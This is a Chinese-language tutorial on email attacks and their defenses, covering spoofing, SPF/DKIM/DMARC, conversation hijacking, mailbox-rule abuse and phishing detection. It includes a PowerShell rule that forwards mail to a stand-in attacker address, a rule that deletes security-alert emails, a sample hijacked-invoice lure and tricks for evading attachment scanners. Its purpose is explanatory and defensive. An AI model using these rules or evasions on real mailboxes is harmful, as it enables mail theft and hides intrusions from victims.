# 电子邮件安全攻击技术

## 邮件攻击全景

电子邮件仍然是组织中最大的攻击面。超过 90% 的网络攻击始于邮件投递，包括钓鱼、社会工程和恶意软件分发。

## 邮件协议安全缺陷

### SMTP (25/TCP)

SMTP 是明文协议，缺乏内置身份验证。攻击手法：
- **邮件伪造（Email Spoofing）**: 直接伪造 From 头部
- **中继攻击**: 利用开放中继转发垃圾邮件

### SPF/DKIM/DMARC

```txt
# SPF 记录 (v=spf1)
example.com IN TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com ~all"
# -all = 严格拒绝, ~all = 软拒绝, ?all = 中立

# DKIM 签名
# 选择器._domainkey.example.com → 公钥
# 发送方用私钥对邮件头部进行签名

# DMARC 策略
_dmarc.example.com IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; pct=100"
# p=none | quarantine | reject — 建议从 p=none 开始逐步收紧
```

### 破坏 SPF/DKIM/DMARC 的技术

```yaml
技术:
  - subdomain takeover: 未配置 SPF/DKIM 的子域名可被攻击者接管
  - display name spoofing: 修改显示名但不改邮件地址
  - lookalike domains: 使用视觉相似的域 (rnicrosoft.com vs microsoft.com)
  - IDN homograph: 使用非 ASCII 字符 (раураl.com vs paypal.com)
```

## 高级邮件攻击技术

### 对话劫持（Conversation Hijacking）

攻击者入侵邮件账户后，利用已存在的邮件线程发送恶意附件：

```
From: legitimate@example.com (已被入侵)
To: victim@target.com
Subject: Re: 发票和付款信息

张总，请查收附件中的最新发票。
—— 李（财务）

[恶意PDF附件]
```

### 邮件规则滥用

攻击者通过 OAuth 访问邮件 API 后，创建隐蔽邮件规则：

```powershell
# Exchange Online: 创建自动转发规则
New-InboxRule -Name "AutoForward" -MyNameInToBox $true -ForwardTo attacker@evil.com

# 隐藏规则：自动将安全告警邮件移至"垃圾邮件"或"已删除"
New-InboxRule -Name "HideAlert" -SubjectContains "安全告警|异常登录|可疑活动" -DeleteMessage $true
```

### 附件绕过技术

```yaml
绕过方法:
  - password-protected zip: 绕过扫描引擎
  - archive bombs: 包含大量小文件的压缩包，导致反病毒引擎超时
  - link-in-PDF: PDF 中放 URL → 绕过初始文件扫描
  - Office OLE/宏混淆: 使用 GUI 触发（形状/ActiveX）绕过宏策略
```

## 邮件安全配置检查清单

### MTA-STS 和 TLS-RPT

```txt
# MTA-STS 策略文件（托管在 https://mta-sts.example.com/.well-known/mta-sts.txt）
version: STSv1
mode: enforce
mx: mail.example.com
mx: *.example.com
max_age: 86400

# TLS-RPT (TLS 报告)
_smtp._tls.example.com IN TXT "v=TLSRPTv1;rua=mailto:tls@example.com"
```

### 企业邮件安全最佳实践

```yaml
配置:
  - SPF: 严格 (-all)，包含所有发送 IP
  - DKIM: 签名所有出站邮件，定期轮换密钥
  - DMARC: p=reject，监控 rua/rur 报告
  - BIMI: 品牌指标 — 验证后显示品牌 Logo
  - MTA-STS: enforce 模式
  - ARC: 保留转发的 DKIM 签名
  - 邮件保留策略: 90天+ 在线保留
```

## 邮件钓鱼检测技术

### 邮件头分析

```powershell
# 获取原始邮件头
Get-MessageTrace -SenderAddress attacker@evil.com | FT Subject, Received, SenderAddress, RecipientAddress

# 检查 Authentication-Results 头
Authentication-Results: spf=pass (sender IP is 203.0.113.5)
  smtp.mailfrom=example.com; dkim=pass (signature was verified)
  header.d=example.com; dmarc=pass action=header.from=example.com
```

### URL 分析

```python
import requests, whois

def analyze_url(url):
    # 检查 URL 重定向
    r = requests.get(url, allow_redirects=True)
    final_url = r.url

    # 检查域名注册
    domain = url.split('/')[2]
    w = whois.whois(domain)
    return {
        'final_url': final_url,
        'registrar': w.registrar,
        'creation_date': w.creation_date,
        'days_old': (datetime.now() - w.creation_date).days if w.creation_date else None,
        'has_redirect': url != final_url
    }
```

## 总结

电子邮件安全需要协议层（SPF/DKIM/DMARC/MTA-STS）、检测层（邮件头分析、URL 沙箱）和培训层（钓鱼演练、安全意识）的三层防御。没有任何单层能完全阻止邮件攻击。
